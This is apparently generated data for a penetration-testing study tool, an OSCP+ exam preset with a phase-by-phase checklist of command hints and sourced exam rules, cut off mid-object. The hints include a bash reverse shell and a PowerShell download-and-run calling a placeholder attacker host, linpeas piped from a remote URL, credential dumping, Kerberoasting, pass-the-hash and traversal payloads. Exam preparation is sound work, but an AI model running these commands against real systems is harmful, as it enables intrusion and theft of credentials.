// ============================================================================
// Session presets, service probes and stuck-hints for the Sessions view.
//
// GENERATED DATA — assembled from vendor documentation and fact-checked against
// official sources. Do not hand-edit; regenerate instead.
//
// Every exam fact here was verified against the vendor's own page, and every
// rule carries a `confidence` field: "official" means the vendor wrote it,
// "inferred" means someone concluded it. That distinction is load-bearing —
// a tool warning that fires on a permitted tool teaches the user to dismiss
// warnings, and then the one that mattered gets dismissed too.
//
// Where a vendor declines to publish a number (OSWE point splits, DCA's pass
// mark, Terraform's domain weights) this data says so rather than inventing
// one. An invented threshold in a tool someone studies with is worse than none.
//
// Loaded on demand by session.js — NOT on first paint.
// ============================================================================
window.CS_SESSION_DATA = {
 "version": 1,
 "generated": "2026-09-11",
 "presets": [
  {
   "id": "oscp-plus",
   "name": "OSCP+ / PEN-200 (current format)",
   "icon": "🛡️",
   "tagline": "The live OffSec exam as it runs today: 3 standalone boxes + a partial-credit assumed-breach AD set, 23h45 on the clock, 24h to report.",
   "focus": "mixed",
   "durationMin": 1425,
   "reportHours": 24,
   "passMark": 70,
   "totalPoints": 100,
   "scoringNote": "3 stand-alone machines at 20 points each (10 for initial access, 10 for privilege escalation) = 60, plus one Active Directory set of 3 machines = 40, awarded per machine as 10/10/20 — partial AD credit, so you no longer have to clear the whole domain to score. 70/100 passes. Bonus points were removed on 1 Nov 2024 and do not exist on this exam.",
   "targets": [
    {
     "key": "standalone-1",
     "label": "Stand-alone #1",
     "kind": "standalone",
     "points": 20,
     "flags": [
      {
       "id": "sa1-local",
       "label": "local.txt — initial access (unprivileged shell)",
       "points": 10
      },
      {
       "id": "sa1-proof",
       "label": "proof.txt — root / SYSTEM / Administrator",
       "points": 10
      }
     ]
    },
    {
     "key": "standalone-2",
     "label": "Stand-alone #2",
     "kind": "standalone",
     "points": 20,
     "flags": [
      {
       "id": "sa2-local",
       "label": "local.txt — initial access (unprivileged shell)",
       "points": 10
      },
      {
       "id": "sa2-proof",
       "label": "proof.txt — root / SYSTEM / Administrator",
       "points": 10
      }
     ]
    },
    {
     "key": "standalone-3",
     "label": "Stand-alone #3",
     "kind": "standalone",
     "points": 20,
     "flags": [
      {
       "id": "sa3-local",
       "label": "local.txt — initial access (unprivileged shell)",
       "points": 10
      },
      {
       "id": "sa3-proof",
       "label": "proof.txt — root / SYSTEM / Administrator",
       "points": 10
      }
     ]
    },
    {
     "key": "ad-machine-1",
     "label": "AD set — machine #1 (assumed breach entry point)",
     "kind": "ad-client",
     "points": 10,
     "flags": [
      {
       "id": "ad1-proof",
       "label": "Flag for AD machine #1 (local.txt / proof.txt per exam control panel)",
       "points": 10
      }
     ]
    },
    {
     "key": "ad-machine-2",
     "label": "AD set — machine #2 (lateral movement)",
     "kind": "ad-client",
     "points": 10,
     "flags": [
      {
       "id": "ad2-proof",
       "label": "Flag for AD machine #2 (local.txt / proof.txt per exam control panel)",
       "points": 10
      }
     ]
    },
    {
     "key": "ad-machine-3",
     "label": "AD set — machine #3 (domain compromise)",
     "kind": "ad-dc",
     "points": 20,
     "flags": [
      {
       "id": "ad3-proof",
       "label": "Flag for AD machine #3 / DC (proof.txt per exam control panel)",
       "points": 20
      }
     ]
    }
   ],
   "phases": [
    {
     "id": "setup",
     "name": "Exam Setup & Clock",
     "goal": "VPN up, objectives read, logging running, budgets understood — before the first packet leaves your box.",
     "items": [
      {
       "label": "Connect the exam VPN (connection pack arrives by email at the exact start time, never earlier)",
       "hint": "sudo openvpn OS-XXXXX-OSCP.ovpn"
      },
      {
       "label": "Confirm tun0 is up and note your VPN address",
       "hint": "ip addr show tun0"
      },
      {
       "label": "Read every target's objectives and point values in the exam control panel",
       "hint": ""
      },
      {
       "label": "Create one working directory per target: scans, loot, screenshots",
       "hint": "mkdir -p ~/exam/{sa1,sa2,sa3,ad}/{nmap,loot,screens}"
      },
      {
       "label": "Start a terminal log so no command or output is ever lost",
       "hint": "script -q -f ~/exam/console-$(date +%F-%H%M).log"
      },
      {
       "label": "Decide how you will spend the single Metasploit allowance — and do not spend it on a 'quick check'",
       "hint": ""
      },
      {
       "label": "Note the revert budget: 24 reverts, resettable once during the exam",
       "hint": ""
      },
      {
       "label": "Confirm proctoring is running on the same host you will work from",
       "hint": ""
      }
     ]
    },
    {
     "id": "recon",
     "name": "Recon — Full Port Discovery",
     "goal": "Every open TCP port on the target, plus the top UDP ports — with nothing missed above 1024.",
     "items": [
      {
       "label": "Full TCP sweep of all 65535 ports",
       "hint": "sudo nmap -p- --min-rate 2000 -T4 -Pn -oA nmap/<TARGET_IP>-all <TARGET_IP>"
      },
      {
       "label": "Re-scan only the open ports with scripts and versions (fast sweeps drop ports — never skip this)",
       "hint": "sudo nmap -sC -sV -p<PORT> -oA nmap/<TARGET_IP>-svc <TARGET_IP>"
      },
      {
       "label": "Top UDP ports — SNMP, TFTP, DNS and IKE footholds hide here",
       "hint": "sudo nmap -sU --top-ports 100 -oA nmap/<TARGET_IP>-udp <TARGET_IP>"
      },
      {
       "label": "Record the exact product and version string of every service in your notes",
       "hint": ""
      },
      {
       "label": "Add any hostname from banners, redirects or TLS certs to /etc/hosts",
       "hint": "echo '<TARGET_IP> <DOMAIN>' | sudo tee -a /etc/hosts"
      },
      {
       "label": "Pull cert subject/SAN names for hidden vhosts and usernames",
       "hint": "openssl s_client -connect <TARGET_IP>:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -iE 'DNS:|Subject:'"
      }
     ]
    },
    {
     "id": "svc-enum",
     "name": "Service Enumeration",
     "goal": "Every open port enumerated by hand down to a named product, a version, and a list of things you can touch unauthenticated.",
     "items": [
      {
       "label": "SMB: signing, OS, null session",
       "hint": "nxc smb <TARGET_IP> -u '' -p ''"
      },
      {
       "label": "SMB: list and spider readable shares",
       "hint": "nxc smb <TARGET_IP> -u '' -p '' --shares"
      },
      {
       "label": "RPC: user and group enumeration over a null bind",
       "hint": "rpcclient -U '' -N <TARGET_IP> -c 'enumdomusers'"
      },
      {
       "label": "FTP: anonymous login, then check for writable dirs served over HTTP",
       "hint": "ftp <TARGET_IP>"
      },
      {
       "label": "SNMP: community string walk (processes, installed software, users)",
       "hint": "snmpwalk -v2c -c public <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2"
      },
      {
       "label": "NFS: exported shares and no_root_squash",
       "hint": "showmount -e <TARGET_IP>"
      },
      {
       "label": "SMTP: VRFY/RCPT user enumeration",
       "hint": "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP>"
      },
      {
       "label": "MSSQL / MySQL / PostgreSQL: try default and reused credentials",
       "hint": "impacket-mssqlclient <USER>:'<PASSWORD>'@<TARGET_IP> -windows-auth"
      },
      {
       "label": "searchsploit every product/version pair you wrote down",
       "hint": "searchsploit <product> <version>"
      },
      {
       "label": "Rank the attack surface before committing: custom web app > known CVE > default creds > brute force",
       "hint": ""
      }
     ]
    },
    {
     "id": "web-discovery",
     "name": "Web Content Discovery",
     "goal": "The full URL surface — directories, files, backups, vhosts and parameters — mapped by hand, with no automatic exploitation tooling.",
     "items": [
      {
       "label": "Fingerprint the stack and framework versions",
       "hint": "whatweb -a3 <TARGET_URL>"
      },
      {
       "label": "Nikto — explicitly permitted on the exam",
       "hint": "nikto -h <TARGET_URL>"
      },
      {
       "label": "Directory discovery with extensions that match the stack",
       "hint": "feroxbuster -u <TARGET_URL> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,asp,aspx,txt,bak"
      },
      {
       "label": "Second pass with a different wordlist — one list is never enough",
       "hint": "gobuster dir -u <TARGET_URL> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,zip,bak"
      },
      {
       "label": "Virtual host fuzzing once you know a domain name",
       "hint": "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<TARGET_IP> -H 'Host: FUZZ.<DOMAIN>' -ac"
      },
      {
       "label": "Read robots.txt, sitemap.xml, JS bundles and HTML comments for paths, API routes and credentials",
       "hint": "curl -s <TARGET_URL>/robots.txt"
      },
      {
       "label": "Try default and vendor credentials against every login page and admin panel",
       "hint": ""
      },
      {
       "label": "Test injection, traversal and upload flaws by hand through Burp Free — sqlmap is a restricted tool and scores the target zero",
       "hint": "curl -s '<TARGET_URL>/?page=../../../../etc/passwd'"
      },
      {
       "label": "Parameter fuzzing on any script that takes input",
       "hint": "ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u '<TARGET_URL>/index.php?FUZZ=test' -fs 0"
      }
     ]
    },
    {
     "id": "foothold",
     "name": "Foothold — Initial Access (10 pts)",
     "goal": "Code execution as any user on the target, from a technique you can explain and replay step by step.",
     "items": [
      {
       "label": "Find and download a PoC you can actually read before running it",
       "hint": "searchsploit -m <edb-id>"
      },
      {
       "label": "Review the exploit line by line; fix hardcoded IPs, ports, offsets and URLs",
       "hint": ""
      },
      {
       "label": "If this is the target you are spending Metasploit on, commit now — using a module or `check` on any target locks the allowance permanently",
       "hint": ""
      },
      {
       "label": "msfvenom is allowed against every target (only the meterpreter payload is limited to the one)",
       "hint": "msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o rev.exe"
      },
      {
       "label": "Serve the payload",
       "hint": "python3 -m http.server 80"
      },
      {
       "label": "Start the catcher before you trigger anything",
       "hint": "rlwrap nc -lvnp <LPORT>"
      },
      {
       "label": "Linux reverse shell",
       "hint": "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<LPORT> 0>&1'"
      },
      {
       "label": "Windows PowerShell download-and-run",
       "hint": "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/rev.ps1')\""
      },
      {
       "label": "Write down the exact request or command that worked — it is the report's Initial Access section verbatim",
       "hint": ""
      }
     ]
    },
    {
     "id": "shell",
     "name": "Shell Stabilisation",
     "goal": "A fully interactive TTY. A proof screenshot taken from a web shell is worth zero points for the whole machine.",
     "items": [
      {
       "label": "Spawn a PTY",
       "hint": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
      },
      {
       "label": "Background, set raw mode, foreground — full TTY with Ctrl-C and tab completion",
       "hint": "stty raw -echo; fg"
      },
      {
       "label": "Fix the terminal type and window size",
       "hint": "export TERM=xterm; stty rows 50 cols 200"
      },
      {
       "label": "Windows: move to WinRM as soon as you have credentials",
       "hint": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASSWORD>'"
      },
      {
       "label": "PowerShell Core / PSSession counts as an interactive shell for proof purposes",
       "hint": "Enter-PSSession -ComputerName <TARGET_IP> -Credential <DOMAIN>\\<USER>"
      },
      {
       "label": "Establish a second, independent way back in before you break anything (reverts cost from a budget of 24)",
       "hint": ""
      },
      {
       "label": "Never capture a flag until you are off the web shell",
       "hint": ""
      }
     ]
    },
    {
     "id": "local-flag",
     "name": "local.txt — Capture & Prove",
     "goal": "local.txt read with cat/type from its original location in an interactive shell, screenshotted with the target's own IP in frame, and submitted in the control panel.",
     "items": [
      {
       "label": "Locate local.txt (readable by the unprivileged account)",
       "hint": "find / -name local.txt 2>/dev/null"
      },
      {
       "label": "Linux: read it from where it lives — never copy it elsewhere first",
       "hint": "cat /home/<USER>/local.txt"
      },
      {
       "label": "Windows: read it from the user's Desktop",
       "hint": "type C:\\Users\\<USER>\\Desktop\\local.txt"
      },
      {
       "label": "Screenshot the contents AND the target's IP in the same frame (Linux)",
       "hint": "cat /home/<USER>/local.txt; ip addr"
      },
      {
       "label": "Screenshot the contents AND the target's IP in the same frame (Windows)",
       "hint": "type C:\\Users\\<USER>\\Desktop\\local.txt & ipconfig"
      },
      {
       "label": "Submit the hash in the exam control panel now — it will not accept anything after the clock stops",
       "hint": ""
      }
     ]
    },
    {
     "id": "sitawareness",
     "name": "Situational Awareness",
     "goal": "Know exactly who you are, what the host runs, and what it is connected to, before you start guessing at escalation.",
     "items": [
      {
       "label": "Identity, groups and privileges",
       "hint": "id; sudo -l"
      },
      {
       "label": "Windows identity and token privileges (read every line of /priv)",
       "hint": "whoami /all"
      },
      {
       "label": "OS, kernel and patch level",
       "hint": "uname -a; cat /etc/os-release"
      },
      {
       "label": "Windows build and installed hotfixes",
       "hint": "systeminfo"
      },
      {
       "label": "Other local users and their home directories",
       "hint": "cat /etc/passwd | grep -vE 'nologin|false'"
      },
      {
       "label": "Running processes, including ones owned by root/SYSTEM",
       "hint": "ps auxww"
      },
      {
       "label": "Internal-only listeners — these are usually the escalation path",
       "hint": "ss -tulpn"
      },
      {
       "label": "Windows listeners and owning PIDs",
       "hint": "netstat -ano | findstr LISTENING"
      },
      {
       "label": "Extra interfaces and routes — note any second subnet, the AD set may sit behind it",
       "hint": "ip a; ip route"
      },
      {
       "label": "ARP cache and known hosts for neighbours worth scanning",
       "hint": "arp -a"
      }
     ]
    },
    {
     "id": "privesc",
     "name": "Privilege Escalation (10 pts)",
     "goal": "root, or SYSTEM / Administrator / an administrator-privileged user. Anything less scores 10 on this box, not 20.",
     "items": [
      {
       "label": "Linux: run linpeas and read the red/yellow hits, not just the summary",
       "hint": "curl -sL http://<ATTACKER_IP>/linpeas.sh | sh"
      },
      {
       "label": "Windows: run winPEAS",
       "hint": "winPEASx64.exe quiet"
      },
      {
       "label": "sudo rights — the single highest-yield check on Linux, cross-reference GTFOBins",
       "hint": "sudo -l"
      },
      {
       "label": "SUID/SGID binaries",
       "hint": "find / -perm -4000 -type f 2>/dev/null"
      },
      {
       "label": "File capabilities",
       "hint": "getcap -r / 2>/dev/null"
      },
      {
       "label": "Cron jobs and hidden root processes",
       "hint": "cat /etc/crontab; ./pspy64"
      },
      {
       "label": "Windows: SeImpersonate/SeAssignPrimaryToken present?",
       "hint": "whoami /priv | findstr /i impersonate"
      },
      {
       "label": "PrintSpoofer — explicitly listed as an allowed tool by OffSec",
       "hint": "PrintSpoofer64.exe -i -c cmd"
      },
      {
       "label": "Service misconfigurations: weak ACLs, unquoted paths, writable binaries",
       "hint": "sc qc <service>"
      },
      {
       "label": "Scheduled tasks running as SYSTEM",
       "hint": "schtasks /query /fo LIST /v | findstr /i \"TaskName Run As User\""
      },
      {
       "label": "Hunt credentials in config files, history, registry and saved sessions",
       "hint": "grep -riE 'password|passwd|secret' /var/www /opt /home 2>/dev/null"
      },
      {
       "label": "Windows stored credentials and autologon",
       "hint": "cmdkey /list; reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword"
      },
      {
       "label": "Reuse every password you have found against every other account on the box",
       "hint": "su <USER>"
      },
      {
       "label": "Kernel exploits last — confirm the exact version and architecture, and remember a crash costs a revert",
       "hint": ""
      },
      {
       "label": "Full vector matrix lives in the Linux/Windows Privilege Escalation playbooks — switch there rather than re-deriving it",
       "hint": ""
      }
     ]
    },
    {
     "id": "proof-flag",
     "name": "proof.txt — Capture & Prove",
     "goal": "proof.txt read as root/SYSTEM from its original location, in an interactive shell, with the target IP in the same screenshot.",
     "items": [
      {
       "label": "Prove the privilege level first — this must be visible in your evidence",
       "hint": "id"
      },
      {
       "label": "Windows: show the account and its group membership",
       "hint": "whoami /groups"
      },
      {
       "label": "Linux: read proof.txt from /root",
       "hint": "cat /root/proof.txt"
      },
      {
       "label": "Windows: read proof.txt from the Administrator Desktop",
       "hint": "type C:\\Users\\Administrator\\Desktop\\proof.txt"
      },
      {
       "label": "Screenshot: file contents + target IP in one frame (Linux)",
       "hint": "cat /root/proof.txt; ip addr"
      },
      {
       "label": "Screenshot: file contents + target IP in one frame (Windows)",
       "hint": "type C:\\Users\\Administrator\\Desktop\\proof.txt & ipconfig"
      },
      {
       "label": "Never move, copy or download the file to read it — it must be cat/type from its original location",
       "hint": ""
      },
      {
       "label": "Submit the hash in the exam control panel before the clock ends",
       "hint": ""
      }
     ]
    },
    {
     "id": "evidence",
     "name": "Evidence Capture & Report Assembly",
     "goal": "A PDF a competent stranger could replay step by step, uploaded correctly inside the 24-hour window.",
     "items": [
      {
       "label": "Screenshot audit: for every scored target, one local.txt frame and one proof.txt frame, each showing the target's own IP",
       "hint": ""
      },
      {
       "label": "Every command and its console output pasted as text — not only as images",
       "hint": ""
      },
      {
       "label": "Modified exploit: include the modified code, the URL of the original, the shellcode generation command, highlighted changes, and why you made them",
       "hint": ""
      },
      {
       "label": "Unmodified exploit: give the URL only — do not paste pages of untouched code",
       "hint": ""
      },
      {
       "label": "Order the machines in the report in the order you want them graded",
       "hint": ""
      },
      {
       "label": "Clean up anything you uploaded to the exam hosts",
       "hint": ""
      },
      {
       "label": "Export to PDF and name it exactly (case-sensitive)",
       "hint": "OSCP-OS-XXXXX-Exam-Report.pdf"
      },
      {
       "label": "Archive as .7z with no password, under 200 MB",
       "hint": "7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf"
      },
      {
       "label": "Record the local MD5 so you can compare it with the one the upload page shows",
       "hint": "md5sum OSCP-OS-XXXXX-Exam-Report.7z"
      },
      {
       "label": "Upload to https://upload.offsec.com, verify the MD5 matches, and click Submit File — an upload without that click is not submitted",
       "hint": ""
      }
     ]
    },
    {
     "id": "ad-initial",
     "name": "AD — Assumed Breach: Machine #1 (10 pts)",
     "goal": "Turn the credential the exam hands you into a shell on the first domain host.",
     "items": [
      {
       "label": "Validate the supplied domain credential against the DC",
       "hint": "nxc smb <DC_IP> -u <USER> -p '<PASSWORD>'"
      },
      {
       "label": "Map the AD subnet and find where that credential is already local admin (look for Pwn3d!)",
       "hint": "nxc smb <DC_IP>/24 -u <USER> -p '<PASSWORD>'"
      },
      {
       "label": "Check remote-access protocols the credential can use",
       "hint": "nxc winrm <TARGET_IP> -u <USER> -p '<PASSWORD>'"
      },
      {
       "label": "RDP as a fallback interactive session",
       "hint": "xfreerdp /v:<TARGET_IP> /u:<USER> /p:'<PASSWORD>' /cert:ignore /dynamic-resolution"
      },
      {
       "label": "Enumerate readable shares for scripts, configs and credentials",
       "hint": "nxc smb <TARGET_IP> -u <USER> -p '<PASSWORD>' --shares"
      },
      {
       "label": "Do NOT run Responder, mitm6 or any poisoning/relay — spoofing is banned on the exam even though Responder appears on the allowed-tools list",
       "hint": ""
      },
      {
       "label": "Get an interactive shell on machine #1",
       "hint": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASSWORD>'"
      },
      {
       "label": "Capture and screenshot the flag on this host before moving on",
       "hint": "type C:\\Users\\<USER>\\Desktop\\local.txt & ipconfig"
      }
     ]
    },
    {
     "id": "ad-harvest",
     "name": "AD — Enumeration & Credential Harvesting",
     "goal": "A full graph of the domain and at least one credential better than the one you were given.",
     "items": [
      {
       "label": "Collect BloodHound data from Kali (Legacy or Community Edition only)",
       "hint": "bloodhound-python -u <USER> -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c all --zip"
      },
      {
       "label": "Or collect on-host with SharpHound",
       "hint": "SharpHound.exe -c All --zipfilename bh.zip"
      },
      {
       "label": "Read the password policy BEFORE any spraying — a lockout can cost you the whole AD set",
       "hint": "nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' --pass-pol"
      },
      {
       "label": "Pull the full domain user list",
       "hint": "nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' --users"
      },
      {
       "label": "Kerberoast every SPN account",
       "hint": "impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP> -request -outputfile spn.hash"
      },
      {
       "label": "Crack the TGS hashes",
       "hint": "hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt"
      },
      {
       "label": "AS-REP roast accounts without pre-authentication",
       "hint": "impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -no-pass -format hashcat"
      },
      {
       "label": "Crack the AS-REP hashes",
       "hint": "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt"
      },
      {
       "label": "Hunt GPP cpassword and scripts in SYSVOL",
       "hint": "nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -M gpp_password"
      },
      {
       "label": "Where you are local admin, dump SAM and LSA secrets",
       "hint": "nxc smb <TARGET_IP> -u <USER> -p '<PASSWORD>' --sam --lsa"
      },
      {
       "label": "Dump in-memory credentials with Mimikatz (explicitly allowed)",
       "hint": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
      },
      {
       "label": "Single-password spray, one round, watching the lockout threshold",
       "hint": "nxc smb <DC_IP> -u users.txt -p '<PASSWORD>' --continue-on-success"
      },
      {
       "label": "Mark every owned principal in BloodHound and run shortest-path-to-Domain-Admins",
       "hint": ""
      }
     ]
    },
    {
     "id": "ad-lateral",
     "name": "AD — Lateral Movement: Machine #2 (10 pts)",
     "goal": "A shell on the second AD host using harvested material, and its flag captured — Metasploit cannot be used here if it was used anywhere else.",
     "items": [
      {
       "label": "Spray a recovered hash across the AD subnet",
       "hint": "nxc smb <DC_IP>/24 -u <USER> -H <HASH>"
      },
      {
       "label": "Execute over WMI",
       "hint": "impacket-wmiexec <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET_IP>"
      },
      {
       "label": "PsExec with a hash when the password never cracked",
       "hint": "impacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<HASH>"
      },
      {
       "label": "WinRM with pass-the-hash",
       "hint": "evil-winrm -i <TARGET_IP> -u <USER> -H <HASH>"
      },
      {
       "label": "smbexec as a fallback when psexec is blocked",
       "hint": "impacket-smbexec <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET_IP>"
      },
      {
       "label": "If the next host is not routable, pivot with chisel or ligolo — Metasploit pivoting is banned outright because it touches more than one target",
       "hint": "./chisel client <ATTACKER_IP>:8000 R:socks"
      },
      {
       "label": "Drive tooling through the tunnel",
       "hint": "proxychains4 -q nxc smb <DC_IP> -u <USER> -p '<PASSWORD>'"
      },
      {
       "label": "Re-dump credentials on the new host — each hop usually yields the next credential",
       "hint": "nxc smb <TARGET_IP> -u <USER> -p '<PASSWORD>' --sam --lsa"
      },
      {
       "label": "Capture and screenshot this host's flag with its IP in frame before moving on",
       "hint": "type C:\\Users\\Administrator\\Desktop\\proof.txt & ipconfig"
      }
     ]
    },
    {
     "id": "ad-domain",
     "name": "AD — Domain Compromise: Machine #3 / DC (20 pts)",
     "goal": "Domain Admin or equivalent, the DC owned, and the whole chain documented host by host.",
     "items": [
      {
       "label": "Work the BloodHound path from an owned principal to Domain Admins",
       "hint": ""
      },
      {
       "label": "Abuse an ACL edge (GenericAll / GenericWrite / WriteDACL)",
       "hint": "bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add groupMember '<GROUP>' <USER>"
      },
      {
       "label": "Force-change a password where you hold ForceChangePassword",
       "hint": "net rpc password <USER> 'NewP@ssw0rd1' -U <DOMAIN>/<USER>%'<PASSWORD>' -S <DC_IP>"
      },
      {
       "label": "Targeted Kerberoast by writing an SPN onto a controlled account",
       "hint": "impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -request-user <USER> -dc-ip <DC_IP>"
      },
      {
       "label": "Constrained delegation / RBCD to impersonate an administrator",
       "hint": "impacket-getST -spn cifs/<DC_IP> -impersonate Administrator <DOMAIN>/<USER>:'<PASSWORD>'"
      },
      {
       "label": "Use the resulting ticket",
       "hint": "export KRB5CCNAME=Administrator.ccache; impacket-psexec -k -no-pass <DOMAIN>/Administrator@<DC_IP>"
      },
      {
       "label": "DCSync a single account once you hold replication rights",
       "hint": "impacket-secretsdump <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP> -just-dc-user krbtgt"
      },
      {
       "label": "Dump the domain hashes",
       "hint": "impacket-secretsdump -just-dc <DOMAIN>/<USER>@<DC_IP>"
      },
      {
       "label": "Own the DC with an interactive shell (required for a valid proof screenshot)",
       "hint": "impacket-psexec <DOMAIN>/Administrator@<DC_IP> -hashes :<HASH>"
      },
      {
       "label": "Capture proof.txt on the DC with the IP in the same frame",
       "hint": "type C:\\Users\\Administrator\\Desktop\\proof.txt & ipconfig"
      },
      {
       "label": "Write the AD chain as its own report section, machine by machine, in grading order",
       "hint": ""
      }
     ]
    }
   ],
   "rules": [
    {
     "kind": "limited",
     "text": "Metasploit modules (Auxiliary, Exploit, Post) and the Meterpreter payload may be used against ONE single target machine of your choice. The choice locks the instant you use either — including running `check`. If the attack fails, you may not move it to another target.",
     "enforceable": "budget:metasploit:1",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Metasploit cannot be used for pivoting — pivoting would use it against more than one target.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "exploit/multi/handler and msfvenom may be used against all target machines — with the exception that the meterpreter payload itself is still limited to your one chosen target.",
     "enforceable": "budget:meterpreter:1",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "limited",
     "text": "Spoofing of any kind — IP, ARP, DNS, NBNS, etc. — is prohibited, which rules out LLMNR/NBT-NS poisoning and the relay attacks that depend on it. Note the distinction: Responder itself is on OffSec's allowed-tools list; it is the poisoning and spoofing modes that are banned, not the binary.",
     "enforceable": "toolban:mitm6,arpspoof,ettercap,bettercap,dnsspoof",
     "source": "https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ",
     "confidence": "official",
     "advisory": true
    },
    {
     "kind": "banned",
     "text": "Automatic exploitation tools: OffSec names db_autopwn, browser_autopwn, SQLmap and SQLninja, plus \"anything that performs a similar function\". Only those four are published names — treat any other tool as your own judgement call, not a rule.",
     "enforceable": "toolban:sqlmap,sqlninja,db_autopwn,browser_autopwn",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official",
     "advisory": true
    },
    {
     "kind": "banned",
     "text": "Mass vulnerability scanners: Nessus, NeXpose, OpenVAS, Canvas, Core Impact, SAINT and similar.",
     "enforceable": "toolban:nessus,nexpose,openvas,canvas,coreimpact,saint",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Commercial tools or services — Metasploit Pro, Burp Suite Pro, etc. Burp Free is fine.",
     "enforceable": "toolban:burpsuite-pro,metasploit-pro",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "AI chatbots and LLMs with direct prompt access (OffSec KAI, ChatGPT, Gemini, Deepseek, etc.) during both the exam and the reporting phase — treated as third-party assistance under the Academic Policy. You are not required to disable passive AI features in tools like Notion or Google AI Overview.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Explicitly permitted: Nmap and its scripting engine, Nikto, Burp Free, DirBuster, BloodHound (Legacy and Community Edition only), SharpHound, PowerShell Empire, Covenant, PowerView, Rubeus, evil-winrm, CrackMapExec, Mimikatz, Impacket, PrintSpoofer. The list is not exhaustive — any tool that performs no restricted action is allowed.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "PowerShell Core / PSSession counts as an interactive shell and is valid for proof screenshots.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "Open book: your own notes, online resources and the OffSec Learning Platform are permitted (AI chatbots excepted). All activity must happen on the host running the proctoring application. Discord may be used to search for information but never to ask for or receive help.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ",
     "confidence": "official"
    },
    {
     "kind": "limited",
     "text": "24 machine reverts, and that limit can be reset once during the exam. All machines are freshly reverted at the start.",
     "enforceable": "budget:reverts:24;reset:1",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "The contents of every local.txt and proof.txt must be submitted in the exam control panel BEFORE the exam clock ends. The panel does not tell you whether a submission is correct, and nothing can be sent afterwards.",
     "enforceable": "deadline:flags:exam-end",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "The order in which machines are documented in the report is the order in which they are graded and valued.",
     "enforceable": "report:order=grading-order",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "Report as a PDF named OSCP-OS-XXXXX-Exam-Report.pdf, archived (no password) into OSCP-OS-XXXXX-Exam-Report.7z, 200 MB maximum, uploaded to https://upload.offsec.com within 24 hours of the exam ending, MD5 verified, and the Submit File button clicked. Filenames are case-sensitive; no other file format is accepted inside the archive.",
     "enforceable": "deadline:report:+24h;limit:archive:200MB;filename:OSCP-OS-XXXXX-Exam-Report",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Downloading applications, files or source code from the exam environment to your local machine, unless necessary to compromise the target — and then delete it once the objective is complete.",
     "enforceable": "",
     "source": "https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "confidence": "official"
    },
    {
     "kind": "required",
